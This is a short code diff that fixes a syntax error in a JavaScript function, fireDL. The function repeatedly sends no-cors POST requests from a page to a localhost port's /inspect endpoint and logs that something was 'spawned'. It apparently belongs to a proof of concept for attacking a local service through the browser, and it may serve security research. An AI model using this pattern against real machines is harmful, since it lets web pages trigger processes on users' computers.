@@ -40,7 +40,7 @@ function fireDL(){
     try{
       await fetch('http://127.0.0.1:'+port+'/inspect',{method:'POST',mode:'no-cors',
         headers:{'Content-Type':'text/plain'},
-        body:JSON.stringify({cwd:'C:/'}));
+        body:JSON.stringify({cwd:'C:/'})});
       log('trigger #'+n+' -> /inspect spawned');
     }catch(e){ log('trigger #'+n+' err'); }
     if(n>=36) clearInterval(iv);
